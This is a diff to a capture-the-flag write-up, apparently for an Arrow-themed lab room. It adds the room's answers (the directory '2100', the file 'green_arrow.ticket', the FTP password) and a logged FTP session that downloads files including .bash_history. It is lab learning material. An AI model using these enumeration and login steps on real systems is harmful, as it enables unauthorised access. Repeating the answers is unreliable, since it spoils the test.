@@ -136,6 +136,11 @@ Finished
 ![image](https://github.com/user-attachments/assets/fb90376a-ebaa-4d98-9c53-2cf1c11e71b6)
 
 <br>
+
+> 1.2. <em>What is the Web Directory you found?.</em><br><a id='3'></a>
+>> <code><strong>2100</strong></code>
+
+<br>
 <p>Running Gobuster again, I found <code>/island/2100/</code>.</p>
 
 <br>
@@ -172,6 +177,10 @@ Finished
 ![image](https://github.com/user-attachments/assets/8fe1db71-172a-4c2b-aac9-c45b342ecbd9)
 
 <br>
+
+> 1.3. <em>what is the file name you found?</em><br><a id='3'></a>
+>> <code><strong>green_arrow.ticket</strong></code>
+
 <p>Used Gobuster again and found <code>/island/2100/green_arrow.ticket/</code>.</p>
 
 <pre><code>~# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://[Target_IP]/island/2100/ -t 40 -x ticket
@@ -198,6 +207,10 @@ Finished
 </code></pre>
 
 <br>
+
+> 1.4. <em>what is the FTP Password?</em><br><a id='3'></a>
+>> <code><strong>!#th3h00d</strong></code>
+
 <p>And look what we found: a token to get into Queen´s Gambit(Ship).</p>
 
 <pre><code>RTy8yhBQdscX
@@ -211,6 +224,82 @@ Finished
 ![image](https://github.com/user-attachments/assets/24208804-9ae1-4f53-8657-9b7e044d1bc5)
 
 <br>
+
+<pre><code>!#th3h00d
+</code></pre>
+
+<pre><code>~# ftp [Target_IP]
+Connected to [Target_IP].
+220 (vsFTPd 3.0.2)
+Name ([Target_IP]:root): vigilante
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
+drwxr-xr-x    4 0        0            4096 May 01  2020 ..
+-rw-------    1 1001     1001           44 May 01  2020 .bash_history
+-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
+-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
+-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
+-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
+-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
+-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
+-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
+226 Directory send OK.
+ftp> get Leave_me_alone.png
+local: Leave_me_alone.png remote: Leave_me_alone.png
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
+226 Transfer complete.
+511720 bytes received in 0.00 secs (117.5371 MB/s)
+ftp> get Queen's_Gambit.png
+local: Queen's_Gambit.png remote: Queen's_Gambit.png
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
+226 Transfer complete.
+549924 bytes received in 0.01 secs (102.5114 MB/s)
+  ftp> get .bash_history
+local: .bash_history remote: .bash_history
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .bash_history (44 bytes).
+226 Transfer complete.
+44 bytes received in 0.00 secs (74.9891 kB/s)
+ftp> get .other_user
+local: .other_user remote: .other_user
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .other_user (2483 bytes).
+226 Transfer complete.
+2483 bytes received in 0.00 secs (4.3770 MB/s)
+ftp> get aa.jpg
+local: aa.jpg remote: aa.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
+226 Transfer complete.
+191026 bytes received in 0.00 secs (52.1398 MB/s)
+ftp> get .profile
+local: .profile remote: .profile
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .profile (675 bytes).
+226 Transfer complete.
+675 bytes received in 0.00 secs (586.9810 kB/s)
+ftp> get .bash_logout
+local: .bash_logout remote: .bash_logout
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .bash_logout (220 bytes).
+226 Transfer complete.
+220 bytes received in 0.00 secs (330.0211 kB/s)
+ftp> exit
+</code></pre>
+
+<br>
+
+
+
 
 
 
